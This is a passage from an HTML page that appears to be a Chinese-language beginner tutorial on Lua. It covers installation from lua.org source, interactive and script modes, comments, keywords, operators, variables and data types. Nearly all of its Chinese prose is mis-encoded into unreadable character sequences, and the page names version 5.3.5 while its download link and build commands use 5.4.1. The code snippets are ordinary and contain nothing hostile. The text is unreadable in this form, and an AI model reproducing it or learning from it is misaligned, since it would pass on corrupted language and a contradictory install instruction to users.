ç‰¹æ€§</h3><p>è·Ÿå…¶ä»–è¯­è¨€è¿›è¡Œæ¯”è¾ƒï¼ŒLuaæœ‰å…¶è‡ªèº«çš„ç‰¹ç‚¹ï¼š</p><p>ï¼ˆ1ï¼‰è½»é‡çº§</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Lua</span>ç”¨æ ‡å‡†<span class="hljs-built_in">C</span>è¯­è¨€ç¼–å†™å¹¶ä»¥æºä»£ç å½¢å¼å¼€å‘ï¼Œç¼–è¯‘åä»…ä»…ä¸€ç™¾ä½™åƒå­—èŠ‚ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„åµŒå…¥åˆ°å…¶ä»–ç¨‹åºä¸­ã€‚<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å¯æ‰©å±•</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Lua</span>æä¾›éå¸¸ä¸°å¯Œæ˜“äºä½¿ç”¨çš„æ‰©å±•æ¥å£å’Œæœºåˆ¶ï¼Œç”±å®¿ä¸»è¯­è¨€<span class="hljs-punctuation">(</span>é€šå¸¸æ˜¯<span class="hljs-built_in">C</span>æˆ–<span class="hljs-built_in">C</span><span class="hljs-operator">++</span><span class="hljs-punctuation">)</span>æä¾›åŠŸèƒ½ï¼Œ<span class="hljs-variable">Lua</span>å¯ä»¥ä½¿ç”¨å®ƒä»¬ï¼Œå°±åƒå†…ç½®çš„åŠŸèƒ½ä¸€æ ·ã€‚<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ”¯æŒé¢å‘è¿‡ç¨‹ç¼–ç¨‹å’Œå‡½æ•°å¼ç¼–ç¨‹</p><h3 id="åº”ç”¨åœºæ™¯"><a class="markdownIt-Anchor" href="#åº”ç”¨åœºæ™¯"></a> åº”ç”¨åœºæ™¯</h3><p>Luaåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­å¾—åˆ°å¤§é‡åº”ç”¨ï¼Œåœºæ™¯çš„åº”ç”¨åœºæ™¯å¦‚ä¸‹:</p><p>æ¸¸æˆå¼€å‘ã€ç‹¬ç«‹åº”ç”¨è„šæœ¬ã€webåº”ç”¨è„šæœ¬ã€æ‰©å±•å’Œæ•°æ®åº“æ’ä»¶ã€ç³»ç»Ÿå®‰å…¨ä¸Šã€‚</p><h3 id="luaçš„å®‰è£…"><a class="markdownIt-Anchor" href="#luaçš„å®‰è£…"></a> Luaçš„å®‰è£…</h3><p>åœ¨linuxä¸Šå®‰è£…Luaéå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸‹è½½æºç åŒ…å¹¶åœ¨ç»ˆç«¯è§£å‹ã€ç¼–è¯‘å³å¯ä½¿ç”¨ã€‚</p><p>Luaçš„å®˜ç½‘åœ°å€ä¸º:<code>https://www.lua.org</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604649954522.png" alt="1604649954522" /></p><ol><li>ç‚¹å‡»downloadå¯ä»¥æ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬çš„ä¸‹è½½åœ°å€ï¼Œæˆ‘ä»¬æœ¬æ¬¡è¯¾ç¨‹é‡‡ç”¨çš„æ˜¯lua-5.3.5,å…¶å¯¹åº”çš„èµ„æºé“¾æ¥åœ°å€ä¸ºhttps://www.lua.org/ftp/lua-5.4.1.tar.gz,ä¹Ÿå¯ä»¥ä½¿ç”¨wgetå‘½ä»¤ç›´æ¥ä¸‹è½½:</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>www.lua.org<span class="hljs-regexp">/ftp/</span>lua-<span class="hljs-number">5.4</span>.<span class="hljs-number">1</span>.tar.gz<br></code></pre></td></tr></table></figure><ol start="2"><li>ç¼–è¯‘å®‰è£…</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> <span class="hljs-keyword">lua</span>-<span class="hljs-number">5.4</span>.<span class="hljs-number">1</span><br><span class="hljs-keyword">make</span> linux test<br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>å¦‚æœåœ¨æ‰§è¡Œmake linux testå¤±è´¥ï¼ŒæŠ¥å¦‚ä¸‹é”™è¯¯:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650028960.png" alt="1604650028960" /></p><p>è¯´æ˜å½“å‰ç³»ç»Ÿç¼ºå°‘libreadline-devä¾èµ–åŒ…ï¼Œéœ€è¦é€šè¿‡å‘½ä»¤æ¥è¿›è¡Œå®‰è£…</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> -y readline-devel<br></code></pre></td></tr></table></figure><p>éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">lua -v</span><br></code></pre></td></tr></table></figure><h3 id="luaçš„è¯­æ³•"><a class="markdownIt-Anchor" href="#luaçš„è¯­æ³•"></a> Luaçš„è¯­æ³•</h3><p>Luaå’ŒC/C<ins>è¯­æ³•éå¸¸ç›¸ä¼¼ï¼Œæ•´ä½“ä¸Šæ¯”è¾ƒæ¸…æ™°ï¼Œç®€æ´ã€‚æ¡ä»¶è¯­å¥ã€å¾ªç¯è¯­å¥ã€å‡½æ•°è°ƒç”¨éƒ½ä¸C/C</ins>åŸºæœ¬ä¸€è‡´ã€‚å¦‚æœå¯¹C/C++ä¸å¤ªç†Ÿæ‚‰çš„åŒå­¦æ¥è¯´ï¼Œä¹Ÿæ²¡å…³ç³»ï¼Œå› ä¸ºå¤©ä¸‹è¯­è¨€æ˜¯ä¸€å®¶ï¼ŒåŸºæœ¬ä¸Šç†è§£èµ·æ¥éƒ½ä¸ä¼šå¤ªå›°éš¾ã€‚æˆ‘ä»¬ä¸€ç‚¹ç‚¹æ¥è®²ã€‚</p><h4 id="ç¬¬ä¸€ä¸ªluaç¨‹åº"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€ä¸ªluaç¨‹åº"></a> ç¬¬ä¸€ä¸ªLuaç¨‹åº</h4><p>å¤§å®¶éœ€è¦çŸ¥é“çš„æ˜¯ï¼ŒLuaæœ‰ä¸¤ç§äº¤äº’æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯:äº¤äº’å¼å’Œè„šæœ¬å¼ï¼Œè¿™ä¸¤è€…çš„åŒºåˆ«ï¼Œä¸‹é¢æˆ‘ä»¬åˆ†åˆ«æ¥è®²è§£ä¸‹ï¼š</p><p>äº¤äº’å¼ä¹‹HELLOWORLD</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">äº¤äº’å¼æ˜¯æŒ‡å¯ä»¥åœ¨å‘½ä»¤è¡Œè¾“å…¥ç¨‹åºï¼Œç„¶åå›è½¦å°±å¯ä»¥çœ‹åˆ°è¿è¡Œçš„æ•ˆæœã€‚<br></code></pre></td></tr></table></figure><p>Luaäº¤äº’å¼ç¼–ç¨‹æ¨¡å¼å¯ä»¥é€šè¿‡å‘½ä»¤lua -i æˆ–luaæ¥å¯ç”¨:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650075000.png" alt="1604650075000" /></p><p>åœ¨å‘½ä»¤è¡Œä¸­keyè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå¹¶æŒ‰å›è½¦,ä¼šæœ‰è¾“å‡ºåœ¨æ§åˆ¶å°ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650092413.png" alt="1604650092413" /></p><p>è„šæœ¬å¼ä¹‹HELLOWORLD</p><p>è„šæœ¬å¼æ˜¯å°†ä»£ç ä¿å­˜åˆ°ä¸€ä¸ªä»¥luaä¸ºæ‰©å±•åçš„æ–‡ä»¶ä¸­å¹¶æ‰§è¡Œçš„æ–¹å¼ã€‚</p><p>æ–¹å¼ä¸€:</p><p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ–‡ä»¶åä¸º hello.lua,åœ¨æ–‡ä»¶ä¸­æ·»åŠ è¦æ‰§è¡Œçš„ä»£ç ï¼Œç„¶åé€šè¿‡å‘½ä»¤ <code>lua hello.lua</code>æ¥æ‰§è¡Œï¼Œä¼šåœ¨æ§åˆ¶å°è¾“å‡ºå¯¹åº”çš„ç»“æœã€‚</p><p>hello.lua</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello World!!&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650118205.png" alt="1604650118205" /></p><p>æ–¹å¼äºŒ:</p><p>å°†hello.luaåšå¦‚ä¸‹ä¿®æ”¹</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!/usr/local/bin/lua</span><br>print(<span class="hljs-string">&quot;Hello World!!!&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œç”¨æ¥æŒ‡å®šLuaè§£é‡Šå™¨æ‰€åœ¨ä½ç½®ä¸º /usr/local/bin/luaï¼ŒåŠ ä¸Š#å·æ ‡è®°è§£é‡Šå™¨ä¼šå¿½ç•¥å®ƒã€‚ä¸€èˆ¬æƒ…å†µä¸‹#!å°±æ˜¯ç”¨æ¥æŒ‡å®šç”¨å“ªä¸ªç¨‹åºæ¥è¿è¡Œæœ¬æ–‡ä»¶ã€‚ä½†æ˜¯hello.luaå¹¶ä¸æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œéœ€è¦é€šè¿‡chmodæ¥è®¾ç½®å¯æ‰§è¡Œæƒé™ï¼Œæœ€ç®€å•çš„æ–¹å¼ä¸º:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">755</span> hello.lua<br></code></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œè¯¥æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hello.lua<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650152287.png" alt="1604650152287" /></p><p>è¡¥å……ä¸€ç‚¹ï¼Œå¦‚æœæƒ³åœ¨äº¤äº’å¼ä¸­è¿è¡Œè„šæœ¬å¼çš„hello.luaä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªdofileå‡½æ•°ï¼Œå¦‚ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">dofile</span><span class="hljs-params">(<span class="hljs-string">&quot;lua_demo/hello.lua&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>æ³¨æ„:åœ¨Luaè¯­è¨€ä¸­ï¼Œè¿ç»­è¯­å¥ä¹‹é—´çš„åˆ†éš”ç¬¦å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åé¢ä¸éœ€è¦åŠ åˆ†å·ï¼Œå½“ç„¶åŠ ä¸Šä¹Ÿä¸ä¼šæŠ¥é”™ï¼Œ</p><p>åœ¨Luaè¯­è¨€ä¸­ï¼Œè¡¨è¾¾å¼ä¹‹é—´çš„æ¢è¡Œä¹Ÿèµ·ä¸åˆ°ä»»ä½•ä½œç”¨ã€‚å¦‚ä»¥ä¸‹å››ä¸ªå†™æ³•ï¼Œå…¶å®éƒ½æ˜¯ç­‰æ•ˆçš„</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">å†™æ³•ä¸€<br><span class="hljs-attribute">a</span>=1<br><span class="hljs-attribute">b</span>=a+2<br>å†™æ³•äºŒ<br><span class="hljs-attribute">a</span>=1;<br><span class="hljs-attribute">b</span>=a+2;<br>å†™æ³•ä¸‰<br><span class="hljs-attribute">a</span>=1; <span class="hljs-attribute">b</span>=a+2;<br>å†™æ³•å››<br><span class="hljs-attribute">a</span>=1 <span class="hljs-attribute">b</span>=a+2<br></code></pre></td></tr></table></figure><p>ä¸å»ºè®®ä½¿ç”¨ç¬¬å››ç§æ–¹å¼ï¼Œå¯è¯»æ€§å¤ªå·®ã€‚</p><h4 id="luaçš„æ³¨é‡Š"><a class="markdownIt-Anchor" href="#luaçš„æ³¨é‡Š"></a> Luaçš„æ³¨é‡Š</h4><p>å…³äºLuaçš„æ³¨é‡Šè¦åˆ†ä¸¤ç§ï¼Œç¬¬ä¸€ç§æ˜¯å•è¡Œæ³¨é‡Šï¼Œç¬¬äºŒç§æ˜¯å¤šè¡Œæ³¨é‡Šã€‚</p><p>å•è¡Œæ³¨é‡Šçš„è¯­æ³•ä¸ºï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--æ³¨é‡Šå†…å®¹</span><br></code></pre></td></tr></table></figure><p>å¤šè¡Œæ³¨é‡Šçš„è¯­æ³•ä¸º:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">--[[</span><br><span class="hljs-comment">æ³¨é‡Šå†…å®¹</span><br><span class="hljs-comment">æ³¨é‡Šå†…å®¹</span><br><span class="hljs-comment">--]]</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæƒ³å–æ¶ˆå¤šè¡Œæ³¨é‡Šï¼Œåªéœ€è¦åœ¨ç¬¬ä¸€ä¸ªâ€“ä¹‹å‰åœ¨åŠ ä¸€ä¸ª-å³å¯ï¼Œå¦‚ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">---[[</span><br>æ³¨é‡Šå†…å®¹<br>æ³¨é‡Šå†…å®¹<br><span class="hljs-comment">--]]</span><br></code></pre></td></tr></table></figure><h4 id="æ ‡è¯†ç¬¦"><a class="markdownIt-Anchor" href="#æ ‡è¯†ç¬¦"></a> æ ‡è¯†ç¬¦</h4><p>æ¢å¥è¯è¯´æ ‡è¯†ç¬¦å°±æ˜¯æˆ‘ä»¬çš„å˜é‡åï¼ŒLuaå®šä¹‰å˜é‡åä»¥ä¸€ä¸ªå­—æ¯ A åˆ° Z æˆ– a åˆ° z æˆ–ä¸‹åˆ’çº¿ _ å¼€å¤´ååŠ ä¸Š0ä¸ªæˆ–å¤šä¸ªå­—æ¯ï¼Œä¸‹åˆ’çº¿ï¼Œæ•°å­—ï¼ˆ0åˆ°9ï¼‰ã€‚è¿™å—å»ºè®®å¤§å®¶æœ€å¥½ä¸è¦ä½¿ç”¨ä¸‹åˆ’çº¿åŠ å¤§å†™å­—æ¯çš„æ ‡è¯†ç¬¦ï¼Œå› ä¸ºLuaçš„ä¿ç•™å­—ä¹Ÿæ˜¯è¿™æ ·å®šä¹‰çš„ï¼Œå®¹æ˜“å‘ç”Ÿå†²çªã€‚æ³¨æ„Luaæ˜¯åŒºåˆ†å¤§å°å†™å­—æ¯çš„ã€‚</p><p><u>A</u>0</p><h4 id="å…³é”®å­—"><a class="markdownIt-Anchor" href="#å…³é”®å­—"></a> å…³é”®å­—</h4><p>ä¸‹åˆ—æ˜¯Luaçš„å…³é”®å­—ï¼Œå¤§å®¶åœ¨å®šä¹‰å¸¸é‡ã€å˜é‡æˆ–å…¶ä»–ç”¨æˆ·è‡ªå®šä¹‰æ ‡è¯†ç¬¦éƒ½è¦é¿å…ä½¿ç”¨ä»¥ä¸‹è¿™äº›å…³é”®å­—ï¼š</p><table><thead><tr><th>and</th><th>break</th><th>do</th><th>else</th></tr></thead><tbody><tr><td>elseif</td><td>end</td><td>false</td><td>for</td></tr><tr><td>function</td><td>if</td><td>in</td><td>local</td></tr><tr><td>nil</td><td>not</td><td>or</td><td>repeat</td></tr><tr><td>return</td><td>then</td><td>true</td><td>until</td></tr><tr><td>while</td><td>goto</td><td></td><td></td></tr></tbody></table><p>ä¸€èˆ¬çº¦å®šï¼Œä»¥ä¸‹åˆ’çº¿å¼€å¤´è¿æ¥ä¸€ä¸²å¤§å†™å­—æ¯çš„åå­—ï¼ˆæ¯”å¦‚ _VERSIONï¼‰è¢«ä¿ç•™ç”¨äº Lua å†…éƒ¨å…¨å±€å˜é‡ã€‚è¿™ä¸ªä¹Ÿæ˜¯ä¸Šé¢æˆ‘ä»¬ä¸å»ºè®®è¿™ä¹ˆå®šä¹‰æ ‡è¯†ç¬¦çš„åŸå› ã€‚</p><h4 id="è¿ç®—ç¬¦"><a class="markdownIt-Anchor" href="#è¿ç®—ç¬¦"></a> è¿ç®—ç¬¦</h4><p>Luaä¸­æ”¯æŒçš„è¿ç®—ç¬¦æœ‰ç®—æœ¯è¿ç®—ç¬¦ã€å…³ç³»è¿ç®—ç¬¦ã€é€»è¾‘è¿ç®—ç¬¦ã€å…¶ä»–è¿ç®—ç¬¦ã€‚</p><p>ç®—æœ¯è¿ç®—ç¬¦:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">+</span>   åŠ æ³•<br><span class="hljs-bullet">-</span>å‡æ³•<br><span class="hljs-bullet">*</span>ä¹˜æ³•<br>/é™¤æ³•<br>%å–ä½™<br>^ä¹˜å¹‚<br><span class="hljs-bullet">-</span>è´Ÿå·<br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-number">10</span>+<span class="hljs-number">20</span><span class="hljs-comment">--&gt;30</span><br><span class="hljs-number">20</span>-<span class="hljs-number">10</span><span class="hljs-comment">--&gt;10</span><br><span class="hljs-number">10</span>*<span class="hljs-number">20</span><span class="hljs-comment">--&gt;200</span><br><span class="hljs-number">20</span>/<span class="hljs-number">10</span><span class="hljs-comment">--&gt;2</span><br><span class="hljs-number">3</span>%<span class="hljs-number">2</span><span class="hljs-comment">--&gt;1</span><br><span class="hljs-number">10</span>^<span class="hljs-number">2</span><span class="hljs-comment">--&gt;100</span><br>-<span class="hljs-number">10</span><span class="hljs-comment">--&gt;-10</span><br></code></pre></td></tr></table></figure><p>å…³ç³»è¿ç®—ç¬¦</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">==ç­‰äº</span><br>~=ä¸ç­‰äº<br>&gt;å¤§äº<br>&lt;å°äº<br>&gt;=å¤§äºç­‰äº<br>&lt;=å°äºç­‰äº<br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">10</span>==<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">true</span><br><span class="hljs-number">10</span>~=<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">false</span><br><span class="hljs-number">20</span>&gt;<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">true</span><br><span class="hljs-number">20</span>&lt;<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">false</span><br><span class="hljs-number">20</span>&gt;=<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">true</span><br><span class="hljs-number">20</span>&lt;=<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>é€»è¾‘è¿ç®—ç¬¦</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">and</span>é€»è¾‘ä¸ A <span class="hljs-keyword">and </span><span class="hljs-keyword">B </span>    &amp;&amp;   <br><span class="hljs-keyword">or</span>é€»è¾‘æˆ– A <span class="hljs-keyword">or </span><span class="hljs-keyword">B </span>    <span class="hljs-title">||</span><br>noté€»è¾‘é  å–åï¼Œå¦‚æœä¸ºtrue,åˆ™è¿”å›false  !<br></code></pre></td></tr></table></figure><p>é€»è¾‘è¿ç®—ç¬¦å¯ä»¥ä½œä¸ºifçš„åˆ¤æ–­æ¡ä»¶ï¼Œè¿”å›çš„ç»“æœå¦‚ä¸‹:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xl">A = <span class="hljs-literal">true</span><br>B = <span class="hljs-literal">true</span><br><br>A <span class="hljs-function"><span class="hljs-title">and</span> B--&gt;</span><span class="hljs-literal">true</span><br>A <span class="hljs-function"><span class="hljs-title">or</span>  B --&gt;</span><span class="hljs-literal">true</span><br><span class="hljs-function"><span class="hljs-title">not</span> A --&gt;</span><span class="hljs-literal">false</span><br><br>A = <span class="hljs-literal">true</span><br>B = <span class="hljs-literal">false</span><br><br>A <span class="hljs-function"><span class="hljs-title">and</span> B--&gt;</span><span class="hljs-literal">false</span><br>A <span class="hljs-function"><span class="hljs-title">or</span>  B --&gt;</span><span class="hljs-literal">true</span><br><span class="hljs-function"><span class="hljs-title">not</span> A --&gt;</span><span class="hljs-literal">false</span><br><br>A = <span class="hljs-literal">false</span><br>B = <span class="hljs-literal">true</span><br><br>A <span class="hljs-function"><span class="hljs-title">and</span> B--&gt;</span><span class="hljs-literal">false</span><br>A <span class="hljs-function"><span class="hljs-title">or</span>  B --&gt;</span><span class="hljs-literal">true</span><br><span class="hljs-function"><span class="hljs-title">not</span> A --&gt;</span><span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><p>å…¶ä»–è¿ç®—ç¬¦</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">..</span>è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²<br><span class="hljs-comment">#ä¸€å…ƒé¢„ç®—æ³•ï¼Œè¿”å›å­—ç¬¦ä¸²æˆ–è¡¨çš„é•¿åº¦</span><br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚:</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;HELLO &quot;</span>..<span class="hljs-string">&quot;WORLD&quot;</span>--&gt;<span class="hljs-variable constant_">HELLO</span> <span class="hljs-variable constant_">WORLD</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">#<span class="hljs-string">&quot;HELLO&quot;</span>--&gt;<span class="hljs-number">5</span></span><br></code></pre></td></tr></table></figure><h4 id="å…¨å±€å˜é‡å±€éƒ¨å˜é‡"><a class="markdownIt-Anchor" href="#å…¨å±€å˜é‡å±€éƒ¨å˜é‡"></a> å…¨å±€å˜é‡&amp;å±€éƒ¨å˜é‡</h4><p>åœ¨Luaè¯­è¨€ä¸­ï¼Œå…¨å±€å˜é‡æ— é¡»å£°æ˜å³å¯ä½¿ç”¨ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå˜é‡æ€»æ˜¯è®¤ä¸ºæ˜¯å…¨å±€çš„ï¼Œå¦‚æœæœªæå‰èµ‹å€¼ï¼Œé»˜è®¤ä¸ºnil:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650220670.png" alt="1604650220670" /></p><p>è¦æƒ³å£°æ˜ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œéœ€è¦ä½¿ç”¨localæ¥å£°æ˜</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650235860.png" alt="1604650235860" /></p><h4 id="luaæ•°æ®ç±»å‹"><a class="markdownIt-Anchor" href="#luaæ•°æ®ç±»å‹"></a> Luaæ•°æ®ç±»å‹</h4><p>Luaæœ‰8ä¸ªæ•°æ®ç±»å‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">nil</span><span class="hljs-params">(ç©ºï¼Œæ— æ•ˆå€¼)</span></span><br><span class="hljs-function"><span class="hljs-title">boolean</span><span class="hljs-params">(å¸ƒå°”ï¼Œtrue/false)</span></span><br><span class="hljs-function"><span class="hljs-title">number</span><span class="hljs-params">(æ•°å€¼)</span></span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(å­—ç¬¦ä¸²)</span></span><br><span class="hljs-function"><span class="hljs-title">function</span><span class="hljs-params">(å‡½æ•°)</span></span><br>tableï¼ˆè¡¨ï¼‰<br><span class="hljs-function"><span class="hljs-title">thread</span><span class="hljs-params">(çº¿ç¨‹)</span></span><br>userdataï¼ˆç”¨æˆ·æ•°æ®ï¼‰<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨typeå‡½æ•°æµ‹è¯•ç»™å®šå˜é‡æˆ–è€…çš„ç±»å‹ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(nil))</span>--&gt;</span>nil<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(<span class="hljs-literal">true</span>))</span>               --&gt;</span> boolean<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(<span class="hljs-number">1.1</span>*<span class="hljs-number">1.1</span>))</span>             --&gt;</span> number<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(<span class="hljs-string">&quot;Hello world&quot;</span>))</span>      --&gt;</span> string<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(io.stdin))</span>--&gt;</span>userdata<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(<span class="hljs-built_in">print</span>))</span>              --&gt;</span> <span class="hljs-keyword">function</span><br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(type))</span>               --&gt;</span><span class="hljs-keyword">function</span><br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type&#123;&#125;)</span>--&gt;</span>table<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(type(X)))</span>            --&gt;</span> string<br></code></pre></td></tr></table></figure><h5 id="nil"><a class="markdownIt-Anchor" href="#nil"></a> 